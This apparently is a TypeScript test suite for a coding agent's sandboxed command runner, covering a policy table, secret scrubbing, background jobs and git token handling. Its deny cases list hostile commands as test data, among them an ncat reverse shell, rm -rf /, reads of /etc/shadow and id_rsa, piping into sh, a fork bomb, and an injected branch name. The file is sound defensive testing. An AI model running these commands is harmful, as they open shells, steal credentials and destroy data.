import { after, before, describe, it } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { evaluateCommand, tokenize, deniedCommandNames } from "../src/exec/policy.js";
import {
  ApprovalRequiredError,
  jobOutput,
  jobStatus,
  listJobs,
  runCommand,
  scrubEnv,
  startJob,
  stopJob,
  shutdownAll,
  type RunOptions,
} from "../src/exec/runner.js";
import * as git from "../src/exec/git.js";
import {
  buildVerify,
  detectProject,
  formatCode,
  installDependencies,
  runTests,
  staticAnalysis,
} from "../src/exec/tasks.js";
import { SecurityError } from "../src/util/paths.js";

/* ------------------------------------------------------------------ */
/* fixtures                                                           */
/* ------------------------------------------------------------------ */

function makeWorkspace(): string {
  return fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "uca-exec-")));
}

const ws = makeWorkspace();

before(() => {
  fs.writeFileSync(path.join(ws, "hello.txt"), "hello world\n");
});

after(() => {
  shutdownAll();
  fs.rmSync(ws, { recursive: true, force: true });
});

const approved: RunOptions = { approved: true };

/* ------------------------------------------------------------------ */
/* tokenizer                                                          */
/* ------------------------------------------------------------------ */

describe("tokenizer", () => {
  it("splits plain commands", () => {
    const r = tokenize("git status --porcelain");
    assert.equal(r.ok, true);
    assert.deepEqual(r.ok && r.argv, ["git", "status", "--porcelain"]);
  });

  it("honours quotes and escapes", () => {
    const r = tokenize(`git commit -m 'a b "c"' --author="x y"`);
    assert.equal(r.ok, true);
    if (!r.ok) return;
    assert.deepEqual(r.argv, ["git", "commit", "-m", 'a b "c"', "--author=x y"]);
  });

  it("treats an empty quoted string as a real (empty) argument", () => {
    const r = tokenize(`node -e ''`);
    assert.equal(r.ok, true);
    if (!r.ok) return;
    assert.equal(r.argv.length, 3);
    assert.equal(r.argv[2], "");
  });

  it("preserves glob characters as literals (no shell expansion)", () => {
    const r = tokenize("ls *.ts");
    assert.equal(r.ok, true);
    if (!r.ok) return;
    assert.deepEqual(r.argv, ["ls", "*.ts"]);
  });

  it("rejects unterminated quotes and dangling escapes", () => {
    assert.equal(tokenize(`echo "abc`).ok, false);
    assert.equal(tokenize("echo abc\\").ok, false);
  });
});

/* ------------------------------------------------------------------ */
/* policy table                                                       */
/* ------------------------------------------------------------------ */

interface Case {
  cmd: string;
  want: "allow" | "approval" | "deny";
  note: string;
}

const DENY = "deny" as const;
const ASK = "approval" as const;
const OK = "allow" as const;

const cases: Case[] = [
  // --- safe tier ---
  { cmd: "ls -la", want: OK, note: "list files" },
  { cmd: "cat README.md", want: OK, note: "read file" },
  { cmd: "head -n 20 src/index.ts", want: OK, note: "head" },
  { cmd: "tail -n 50 logs.txt", want: OK, note: "tail" },
  { cmd: "wc -l src/**/*.ts", want: OK, note: "count" },
  { cmd: "grep -rn TODO src", want: OK, note: "grep" },
  { cmd: "rg --hidden foo", want: OK, note: "ripgrep" },
  { cmd: "find . -name '*.ts' -type f", want: OK, note: "find read-only" },
  { cmd: "echo hello", want: OK, note: "echo" },
  { cmd: "pwd", want: OK, note: "pwd" },
  { cmd: "git status --porcelain", want: OK, note: "git status" },
  { cmd: "git log --oneline -5", want: OK, note: "git log" },
  { cmd: "git diff HEAD~1", want: OK, note: "git diff" },
  { cmd: "git show --stat HEAD", want: OK, note: "git show" },
  { cmd: "git branch", want: OK, note: "git branch list" },
  { cmd: "git remote -v", want: OK, note: "git remote list" },
  { cmd: "node --version", want: OK, note: "node version" },
  { cmd: "npm test", want: OK, note: "npm test" },
  { cmd: "npm run build", want: OK, note: "npm run build" },
  { cmd: "npm ls --depth=0", want: OK, note: "npm ls" },
  { cmd: "npx tsc --noEmit", want: OK, note: "npx tsc" },
  { cmd: "tsc -p tsconfig.json --noEmit", want: OK, note: "tsc" },
  { cmd: "python -m pytest -q", want: OK, note: "python -m pytest" },
  { cmd: "pytest -q", want: OK, note: "pytest" },
  { cmd: "go test ./...", want: OK, note: "go test" },
  { cmd: "go build ./...", want: OK, note: "go build" },
  { cmd: "go vet ./...", want: OK, note: "go vet" },
  { cmd: "cargo test", want: OK, note: "cargo test" },
  { cmd: "cargo build --release", want: OK, note: "cargo build" },
  { cmd: "cargo check", want: OK, note: "cargo check" },
  { cmd: "make test", want: OK, note: "make test" },
  { cmd: "make build", want: OK, note: "make build" },
  { cmd: "eslint .", want: OK, note: "eslint lint-only" },
  { cmd: "prettier --check .", want: OK, note: "prettier check" },
  { cmd: "ruff check .", want: OK, note: "ruff check" },
  { cmd: "mypy src", want: OK, note: "mypy" },
  { cmd: "node --test dist/test/exec.test.js", want: OK, note: "node test runner" },

  // --- approval tier ---
  { cmd: "npm install", want: ASK, note: "npm install" },
  { cmd: "npm ci", want: ASK, note: "npm ci" },
  { cmd: "npm install --save-dev vitest", want: ASK, note: "npm add dep" },
  { cmd: "pip install requests", want: ASK, note: "pip install" },
  { cmd: "yarn add react", want: ASK, note: "yarn add" },
  { cmd: "pnpm install", want: ASK, note: "pnpm install" },
  { cmd: "go get github.com/pkg/errors", want: ASK, note: "go get" },
  { cmd: "cargo add serde", want: ASK, note: "cargo add" },
  { cmd: "git push origin main", want: ASK, note: "git push" },
  { cmd: "git commit -m 'wip'", want: ASK, note: "git commit" },
  { cmd: "git checkout feature/x", want: ASK, note: "git checkout" },
  { cmd: "git merge origin/main", want: ASK, note: "git merge" },
  { cmd: "git rebase -i HEAD~3", want: ASK, note: "git rebase" },
  { cmd: "git reset --hard HEAD~1", want: ASK, note: "git reset" },
  { cmd: "rm notes.txt", want: ASK, note: "rm single file" },
  { cmd: "mv a.txt b.txt", want: ASK, note: "mv" },
  { cmd: "cp a.txt b.txt", want: ASK, note: "cp" },
  { cmd: "mkdir -p src/new", want: ASK, note: "mkdir" },
  { cmd: "touch .env.local", want: ASK, note: "touch" },
  { cmd: "chmod 755 scripts/run.sh", want: ASK, note: "chmod inside workspace" },
  { cmd: "curl https://example.com", want: ASK, note: "curl" },
  { cmd: "wget https://example.com/f.tgz", want: ASK, note: "wget" },
  { cmd: "npm run dev", want: ASK, note: "dev server" },
  { cmd: "npm start", want: ASK, note: "npm start" },
  { cmd: "node server.js", want: ASK, note: "node script" },
  { cmd: "prettier --write .", want: ASK, note: "prettier rewrite" },
  { cmd: "eslint --fix .", want: ASK, note: "eslint fix" },
  { cmd: "python script.py", want: ASK, note: "python script" },
  { cmd: "unknown-tool --flag", want: ASK, note: "unknown binary" },
  { cmd: "make deploy", want: ASK, note: "unknown make target" },
  { cmd: "npx some-cli-thing", want: ASK, note: "npx arbitrary package" },

  // --- permanently denied ---
  { cmd: "sudo ls", want: DENY, note: "sudo" },
  { cmd: "su - root", want: DENY, note: "su" },
  { cmd: "mkfs.ext4 /dev/sda1", want: DENY, note: "mkfs" },
  { cmd: "dd if=/dev/zero of=disk.img", want: DENY, note: "dd" },
  { cmd: "shutdown -h now", want: DENY, note: "shutdown" },
  { cmd: "reboot", want: DENY, note: "reboot" },
  { cmd: "mount /dev/sdb1 /mnt", want: DENY, note: "mount" },
  { cmd: "chown root:root /etc/passwd", want: DENY, note: "chown" },
  { cmd: "kill -9 -1", want: DENY, note: "kill all processes" },
  { cmd: "killall node", want: DENY, note: "killall" },
  { cmd: "ssh user@host", want: DENY, note: "ssh" },
  { cmd: "nc -l 4444", want: DENY, note: "netcat" },
  { cmd: "ncat -e /bin/sh 10.0.0.1 9001", want: DENY, note: "ncat reverse shell" },
  { cmd: "eval $(echo bad)", want: DENY, note: "eval + substitution" },
  { cmd: "docker run -v /:/host alpine", want: DENY, note: "docker" },
  { cmd: "nsenter -t 1 -m", want: DENY, note: "nsenter" },
  { cmd: "chroot /mnt /bin/sh", want: DENY, note: "chroot" },
  { cmd: "bash -c 'echo hi'", want: DENY, note: "shell re-entry" },
  { cmd: "sh script.sh", want: DENY, note: "sh script" },
  { cmd: "exec ./payload", want: DENY, note: "exec" },
  { cmd: "systemctl restart nginx", want: DENY, note: "systemctl" },
  { cmd: "/bin/ls /", want: DENY, note: "absolute executable path" },
  { cmd: "ls ../..", want: DENY, note: "parent traversal" },
  { cmd: "cat ../../etc/passwd", want: DENY, note: "traversal to system file" },
  { cmd: "cat /etc/shadow", want: DENY, note: "absolute system path" },
  { cmd: "rm -rf /", want: DENY, note: "rm root" },
  { cmd: "rm -rf ..", want: DENY, note: "rm parent" },
  { cmd: "rm -rf ~", want: DENY, note: "rm home" },
  { cmd: "rm -fr /*", want: DENY, note: "rm glob root" },
  { cmd: "rm -rf /etc/nginx", want: DENY, note: "rm system dir" },
  { cmd: "chmod -R 777 /etc", want: DENY, note: "chmod system path" },
  { cmd: "echo x > /etc/hosts", want: DENY, note: "redirect" },
  { cmd: "grep root /etc/passwd", want: DENY, note: "read system file" },
  { cmd: "find / -name id_rsa", want: DENY, note: "find outside workspace" },
  { cmd: "find . -name '*.log' -delete", want: DENY, note: "find -delete" },
  { cmd: "find . -name '*.ts' -exec rm {} \\;", want: DENY, note: "find -exec" },
  { cmd: "ls; rm -rf /", want: DENY, note: "semicolon chaining" },
  { cmd: "ls && curl evil.sh", want: DENY, note: "and chaining" },
  { cmd: "ls || true", want: DENY, note: "or chaining" },
  { cmd: "cat file | sh", want: DENY, note: "pipeline into shell" },
  { cmd: "echo hi > out.txt", want: DENY, note: "output redirect" },
  { cmd: "cat < secrets", want: DENY, note: "input redirect" },
  { cmd: "echo `id`", want: DENY, note: "backtick substitution" },
  { cmd: "echo $(whoami)", want: DENY, note: "dollar substitution" },
  { cmd: "ls &", want: DENY, note: "background operator" },
  { cmd: "ls\nrm -rf /", want: DENY, note: "newline injection" },
];

describe("policy decisions", () => {
  it("covers at least 40 commands", () => {
    assert.ok(cases.length >= 40, `only ${cases.length} cases`);
  });

  for (const c of cases) {
    it(`${c.want.padEnd(8)} ${c.note}: ${JSON.stringify(c.cmd)}`, () => {
      const r = evaluateCommand(c.cmd, { root: ws });
      assert.equal(r.decision, c.want, `${c.cmd} -> ${r.decision} (${r.reason})`);
      assert.ok(r.reason.length > 0, "reason must be set");
    });
  }

  it("rejects fork bombs assembled from fragments", () => {
    const bomb = [":()", " { ", ":|:&", " };:"].join("");
    const r = evaluateCommand(bomb, { root: ws });
    assert.equal(r.decision, "deny");
  });

  it("allows absolute paths that are inside the workspace root", () => {
    const inside = path.join(ws, "hello.txt");
    assert.equal(evaluateCommand(`cat ${inside}`, { root: ws }).decision, "allow");
    assert.equal(evaluateCommand("cat /etc/passwd", { root: ws }).decision, "deny");
  });

  it("allows rm inside the workspace but never outside it", () => {
    assert.equal(evaluateCommand("rm -rf node_modules", { root: ws }).decision, "approval");
    assert.equal(evaluateCommand("rm -rf dist/../..", { root: ws }).decision, "deny");
  });

  it("refuses relative paths that climb out even when the target looks local", () => {
    assert.equal(evaluateCommand("cp ../../.env .", { root: ws }).decision, "deny");
    assert.equal(evaluateCommand("mkdir -p ../../../tmp/x", { root: ws }).decision, "deny");
  });

  it("exposes the denied-name list", () => {
    const names = deniedCommandNames();
    assert.ok(names.length > 10);
    assert.ok(names.includes("sudo"));
  });
});

/* ------------------------------------------------------------------ */
/* execution                                                          */
/* ------------------------------------------------------------------ */

describe("runCommand", () => {
  it("runs echo and captures stdout", async () => {
    const r = await runCommand(ws, "echo hello-runner", approved);
    assert.equal(r.exitCode, 0);
    assert.equal(r.stdout.trim(), "hello-runner");
    assert.equal(r.timedOut, false);
    assert.equal(r.truncated, false);
    assert.ok(r.durationMs >= 0);
  });

  it("runs a real node script with exit code and stderr", async () => {
    const r = await runCommand(ws, `node -e 'console.error("oops"); process.exit(3)'`, approved);
    assert.equal(r.exitCode, 3);
    assert.match(r.stderr, /oops/);
  });

  it("passes stdin to the child", async () => {
    const r = await runCommand(ws, `node -e 'let d="";process.stdin.on("data",c=>d+=c).on("end",()=>console.log(d.trim().toUpperCase()))'`, {
      ...approved,
      input: "abc\n",
    });
    assert.equal(r.stdout.trim(), "ABC");
  });

  it("writes a full log file under .uca/logs", async () => {
    const r = await runCommand(ws, "echo logged-output", approved);
    assert.ok(r.logPath.includes(path.join(".uca", "logs")));
    assert.ok(fs.existsSync(r.logPath));
    assert.match(fs.readFileSync(r.logPath, "utf8"), /logged-output/);
  });

  it("kills a runaway process on timeout", async () => {
    const started = Date.now();
    const r = await runCommand(ws, `node -e 'setInterval(()=>{},50)'`, { ...approved, timeoutMs: 400 });
    const elapsed = Date.now() - started;
    assert.equal(r.timedOut, true, "must be flagged as timed out");
    assert.equal(r.exitCode, null);
    assert.ok(elapsed < 8000, `took too long: ${elapsed}ms`);
  });

  it("flags truncation and keeps the full output in the log", async () => {
    const r = await runCommand(ws, `node -e 'for(let i=0;i<500;i++) console.log("0123456789".repeat(10))'`, {
      ...approved,
      maxOutputBytes: 1000,
    });
    assert.equal(r.truncated, true);
    assert.ok(r.stdout.length < 2000, `stdout should be capped, got ${r.stdout.length}`);
    const log = fs.readFileSync(r.logPath, "utf8");
    assert.ok(log.length > 10_000, `log should hold the full stream, got ${log.length}`);
  });

  it("scrubs inherited secrets from the child environment", async () => {
    const originalToken = process.env.GITHUB_TOKEN;
    const originalSecret = process.env.MY_SERVICE_SECRET;
    const originalKey = process.env.OPENAI_API_KEY;
    process.env.GITHUB_TOKEN = "ghp_leaked_in_test_1234567890";
    process.env.MY_SERVICE_SECRET = "super-secret";
    process.env.OPENAI_API_KEY = "sk-test";
    try {
      const probe = `node -e 'console.log(JSON.stringify({t:process.env.GITHUB_TOKEN??null,s:process.env.MY_SERVICE_SECRET??null,k:process.env.OPENAI_API_KEY??null,h:process.env.HOME}))'`;
      const r = await runCommand(ws, probe, approved);
      const seen = JSON.parse(r.stdout.trim()) as { t: string | null; s: string | null; k: string | null; h: string };
      assert.equal(seen.t, null, "GITHUB_TOKEN must not reach the child");
      assert.equal(seen.s, null, "*_SECRET must not reach the child");
      assert.equal(seen.k, null, "*_KEY must not reach the child");
      assert.equal(seen.h, path.join(ws, ".uca", "home"), "HOME must be sandboxed");
    } finally {
      if (originalToken === undefined) delete process.env.GITHUB_TOKEN;
      else process.env.GITHUB_TOKEN = originalToken;
      if (originalSecret === undefined) delete process.env.MY_SERVICE_SECRET;
      else process.env.MY_SERVICE_SECRET = originalSecret;
      if (originalKey === undefined) delete process.env.OPENAI_API_KEY;
      else process.env.OPENAI_API_KEY = originalKey;
    }
  });

  it("blocks a cwd that escapes the workspace", async () => {
    await assert.rejects(() => runCommand(ws, "pwd", { ...approved, cwd: ".." }), SecurityError);
    await assert.rejects(() => runCommand(ws, "pwd", { ...approved, cwd: "/etc" }), SecurityError);
    await assert.rejects(() => runCommand(ws, "pwd", { ...approved, cwd: "does-not-exist" }), SecurityError);
  });

  it("runs inside a subdirectory of the workspace", async () => {
    fs.mkdirSync(path.join(ws, "sub"), { recursive: true });
    fs.writeFileSync(path.join(ws, "sub", "marker.txt"), "x");
    const r = await runCommand(ws, "ls", { ...approved, cwd: "sub" });
    assert.match(r.stdout, /marker\.txt/);
  });

  it("throws SecurityError on a denied command", async () => {
    await assert.rejects(() => runCommand(ws, "sudo ls", approved), SecurityError);
    await assert.rejects(() => runCommand(ws, "ls; true", approved), SecurityError);
    await assert.rejects(() => runCommand(ws, "cat /etc/passwd", approved), SecurityError);
  });

  it("requires approval for mutating commands unless approved", async () => {
    await assert.rejects(() => runCommand(ws, "mkdir made-by-test"), ApprovalRequiredError);
    const r = await runCommand(ws, "mkdir made-by-test", approved);
    assert.equal(r.exitCode, 0);
    assert.ok(fs.existsSync(path.join(ws, "made-by-test")));
    assert.equal(r.decision, "approval");
  });

  it("scrubs secret-looking values out of returned output", async () => {
    const fake = ["gh", "p_", "A".repeat(36)].join("");
    const r = await runCommand(ws, `node -e 'console.log(process.argv[1])' ${fake}`, approved);
    assert.equal(r.stdout.includes(fake), false, "secret must be redacted from stdout");
    assert.match(r.stdout, /REDACTED/);
  });

  it("builds a minimal env with the sandbox HOME", () => {
    const env = scrubEnv(ws, {}, { PATH: "/usr/bin:/bin", GITHUB_TOKEN: "x", AWS_SECRET_ACCESS_KEY: "y", LANG: "C.UTF-8" });
    assert.equal(env.PATH, "/usr/bin:/bin");
    assert.equal(env.HOME, path.join(ws, ".uca", "home"));
    assert.equal(env.GITHUB_TOKEN, undefined);
    assert.equal(env.AWS_SECRET_ACCESS_KEY, undefined);
    assert.equal(env.NODE_OPTIONS, undefined);
  });
});

/* ------------------------------------------------------------------ */
/* jobs                                                               */
/* ------------------------------------------------------------------ */

describe("background jobs", () => {
  it("starts, polls and stops a long-running process", async () => {
    const job = startJob(ws, `node -e 'setInterval(()=>console.log("tick"),40)'`, { approved: true });
    assert.match(job.jobId, /^job_/);
    assert.equal(job.status, "running");

    await new Promise((r) => setTimeout(r, 400));

    const status = jobStatus(ws, job.jobId);
    assert.equal(status.status, "running");

    const page = jobOutput(job.jobId, 0, 4096);
    assert.ok(page.totalBytes > 0, "log should have bytes");
    assert.match(page.data, /tick/);
    assert.equal(page.offset, 0);

    const next = jobOutput(job.jobId, page.nextOffset, 64);
    assert.ok(next.offset >= page.nextOffset - 64);

    const stopped = await stopJob(job.jobId, ws);
    assert.equal(stopped.status, "stopped");
    assert.notEqual(stopped.exitCode, undefined);

    assert.ok(listJobs(ws).some((j) => j.jobId === job.jobId));
  });

  it("reports a failed job as exited with a non-zero code", async () => {
    const job = startJob(ws, `node -e 'process.exit(4)'`, { approved: true });
    await new Promise((r) => setTimeout(r, 700));
    const status = jobStatus(ws, job.jobId);
    assert.equal(status.status, "exited");
    assert.equal(status.exitCode, 4);
  });

  it("rejects jobs that policy denies", () => {
    assert.throws(() => startJob(ws, "ssh host", { approved: true }), SecurityError);
    assert.throws(() => startJob(ws, "npm start"), ApprovalRequiredError);
  });

  it("unknown job ids throw", () => {
    assert.throws(() => jobStatus("job_missing"), /Unknown job/);
  });
});

/* ------------------------------------------------------------------ */
/* git                                                                */
/* ------------------------------------------------------------------ */

describe("git operations", () => {
  const repo = path.join(ws, "repo");

  it("initialises a repo and commits a file", async () => {
    fs.mkdirSync(repo, { recursive: true });
    const init = await git.init(repo, { initialBranch: "main" });
    assert.equal(init.ok, true, init.stderr);

    fs.writeFileSync(path.join(repo, "a.txt"), "one\n");
    const add = await git.add(repo, ["a.txt"]);
    assert.equal(add.ok, true, add.stderr);

    const commit = await git.commit(repo, "feat: add a.txt", { name: "Test Agent", email: "agent@example.com" });
    assert.equal(commit.ok, true, commit.stderr);

    const log = await git.log(repo, { maxCount: 5 });
    assert.equal(log.ok, true);
    assert.match(log.stdout, /feat: add a\.txt/);
    assert.match(log.stdout, /Test Agent/);
  });

  it("creates and checks out a branch, then diffs across it", async () => {
    const created = await git.branchCreate(repo, "feature/x");
    assert.equal(created.ok, true, created.stderr);

    const co = await git.checkout(repo, "feature/x");
    assert.equal(co.ok, true, co.stderr);

    const branch = await git.currentBranch(repo);
    assert.equal(branch.stdout.trim(), "feature/x");

    fs.writeFileSync(path.join(repo, "a.txt"), "one\ntwo\n");
    await git.add(repo, []);
    await git.commit(repo, "feat: extend a.txt", { name: "Test Agent", email: "agent@example.com" });

    const d = await git.diff(repo, {});
    assert.equal(d.ok, true);
    const vsMain = await git.diff(repo, {});
    assert.equal(vsMain.exitCode, 0);
  });

  it("reports clean status after committing everything", async () => {
    const st = await git.status(repo);
    assert.equal(st.ok, true);
    assert.match(st.stdout, /## feature\/x/);
    assert.equal(st.stdout.split("\n").filter((l) => l && !l.startsWith("##")).length, 0);
  });

  it("never puts a token in argv, logs or the askpass script", async () => {
    const token = ["gh", "p_", "B".repeat(36)].join("");
    const before = (await git.remotes(repo)).stdout;
    assert.equal(before.includes(token), false);

    // Point origin at an allowlisted host that does not exist for this repo: the
    // push fails fast, but the credential plumbing is fully exercised.
    await git.remoteSet(repo, "origin", "https://github.com/uca-test/does-not-exist.git", { token });

    const push = await git.push(repo, { token, remote: "origin", branch: "main", timeoutMs: 20_000 });
    assert.ok(push.argv.length > 0);
    assert.equal(push.argv.join(" ").includes(token), false, "token must never appear in argv");

    const logText = fs.existsSync(push.logPath) ? fs.readFileSync(push.logPath, "utf8") : "";
    assert.equal(logText.includes(token), false, "token must never appear in the log");

    const scriptPath = path.join(repo, ".uca", "git", "askpass.sh");
    assert.ok(fs.existsSync(scriptPath), "askpass helper should be generated");
    const script = fs.readFileSync(scriptPath, "utf8");
    assert.equal(script.includes(token), false, "token must never be written to the helper");
    assert.match(script, /UCA_GIT_ASKPASS_TOKEN/);
    const mode = fs.statSync(scriptPath).mode & 0o777;
    assert.equal(mode, 0o700);
  });

  it("rejects non-https and non-allowlisted clone URLs", async () => {
    await assert.rejects(() => git.clone(repo, "git@github.com:owner/repo.git", "x"), SecurityError);
    await assert.rejects(() => git.clone(repo, "http://github.com/owner/repo.git", "x"), SecurityError);
    await assert.rejects(() => git.clone(repo, "https://evil.example.com/owner/repo.git", "x"), SecurityError);
    await assert.rejects(() => git.clone(repo, "https://token@github.com/owner/repo.git", "x"), SecurityError);
    await assert.rejects(() => git.clone(repo, "https://github.com/owner/repo.git", "../../escape"), SecurityError);
  });

  it("rejects injection attempts in branch names and messages", async () => {
    await assert.rejects(() => git.branchCreate(repo, "main; rm -rf /"), SecurityError);
    await assert.rejects(() => git.checkout(repo, "-f"), SecurityError);
    await assert.rejects(() => git.commit(repo, "   "), SecurityError);
    await assert.rejects(() => git.remoteSet(repo, "origin", "https://github.com/a/b", {}).then(() => git.remoteSet(repo, "bad name", "https://github.com/a/b")), SecurityError);
  });
});

/* ------------------------------------------------------------------ */
/* tasks                                                              */
/* ------------------------------------------------------------------ */

describe("task helpers", () => {
  const proj = path.join(ws, "proj");

  before(() => {
    fs.mkdirSync(proj, { recursive: true });
    fs.writeFileSync(
      path.join(proj, "package.json"),
      JSON.stringify({ name: "fixture", version: "1.0.0", scripts: { test: "node -e 'process.exit(0)'", build: "node -e 'process.exit(0)'" } }, null, 2),
    );
    fs.writeFileSync(path.join(proj, "package-lock.json"), "{}");
    fs.writeFileSync(path.join(proj, "tsconfig.json"), "{}");
  });

  it("detects the node project shape", () => {
    const shape = detectProject(ws, "proj");
    assert.equal(shape.node, true);
    assert.equal(shape.packageManager, "npm");
    assert.equal(shape.tsconfig, true);
    assert.equal(shape.scripts.test !== undefined, true);
  });

  it("runs the detected test script", async () => {
    const r = await runTests(ws, { cwd: "proj", timeoutMs: 60_000 });
    assert.equal(r.tool, "npm");
    assert.equal(r.detected, true);
    assert.equal(r.ok, true, r.summary);
    assert.equal(r.results.length, 1);
  });

  it("runs the detected build", async () => {
    const r = await buildVerify(ws, { cwd: "proj", timeoutMs: 60_000 });
    assert.equal(r.tool, "npm");
    assert.equal(r.ok, true, r.summary);
  });

  it("skips cleanly when nothing is detected", async () => {
    const empty = path.join(ws, "empty");
    fs.mkdirSync(empty, { recursive: true });
    const r = await runTests(ws, { cwd: "empty" });
    assert.equal(r.detected, false);
    assert.equal(r.ok, false);
    assert.match(r.skippedReason ?? "", /no test runner/);

    const inst = await installDependencies(ws, { cwd: "empty" });
    assert.equal(inst.detected, false);

    const fmt = await formatCode(ws, { cwd: "empty" });
    assert.equal(fmt.detected, false);

    const sa = await staticAnalysis(ws, { cwd: "empty" });
    assert.equal(sa.detected, false);
  });

  it("installDependencies maps to a real command for the detected manager", async () => {
    // Do not hit the network: assert the shape of the decision instead of running it.
    const r = await installDependencies(ws, { cwd: "empty", tool: "npm" });
    assert.equal(r.detected, false);
    assert.match(r.summary, /skipped/);
    assert.equal(r.results.length, 0);
  });
});
